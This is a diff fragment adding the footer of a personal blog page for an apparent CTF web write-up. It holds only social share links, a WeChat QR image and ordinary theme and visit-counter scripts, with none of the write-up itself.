+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/42277/&title=《杭州"西湖论剑"ctf-Web》 — Somnus's blog&source=这场比赛打了个酱油，只解了3题。意识到自己还需更加努力学习，趁着平台再次开放，复现一下Web的三道题" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/42277/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《杭州"西湖论剑"ctf-Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/42277/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/42277/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABuklEQVR42u3aS5LDIAwFQN//0p4DJCFPfBTXVLPywoZOFpR44rricb+MT++8vj+e7ToxcHFxl7n3cIwXyBfO5//y1+Di4jZyk41pvKklz59+ZGLAxcV9Mnf8bVLW4OLi/lduXqyMix5cXNwnc/ONJlkmKWWOn9VwcXEXuHlKee75SL6Li4s7xb2LoxqRrISkb77CxcVt4eYbyrjsyFuw1Y0MFxf3V9y9RclcLFKeARcX9zA3Dy4LseZCa7ZQ4uDi4h7jVqHVcmcuBv3yJ+Li4rZwz12hqCaf+QaKi4vbyZ0ra3a1SCdnwMXF3cqda43MXbYYb1jlfBcXF7eRe66JUm2yvlHh4uI2cqsbTfWgMuYW5sTFxW3hrjQ/ThyEJqNSXFzcrdw8+pwLNPPLHMlmh4uL28/NDyHr4Uj1mISLi/srbufBptrixcXF7eHexZEfk+a+Wrq1gYuLu4k7dyWiSkzClEKTFRcXt4VbbnPGy881aKP2CS4ubgu3GnSuH5Cq7RxcXNzncxP6SkhaTk1wcXEfzJ1r1haEuLi4jdzk8LN+7XLDz8bFxW3hrjQ+q6VMsnwewuLi4h7g/gGHCwsJW4KO1gAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
